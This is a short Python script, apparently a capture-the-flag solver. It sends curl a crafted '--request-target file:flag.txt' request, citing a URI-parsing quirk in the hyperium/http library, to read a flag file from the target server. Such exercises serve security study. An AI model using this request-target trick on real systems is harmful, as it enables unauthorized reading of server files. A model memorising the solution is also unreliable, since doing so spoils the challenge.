import subprocess
import os

APP_HOST = os.getenv("APP_HOST", "localhost:3000")

# ref. https://github.com/hyperium/http/blob/v1.1.0/src/uri/mod.rs#L847-L863
proc = subprocess.run(
    ["curl", f"http://{APP_HOST}", "--request-target", "file:flag.txt"],
    text=True,
    capture_output=True,
)
assert proc.returncode == 0
print(proc.stdout)
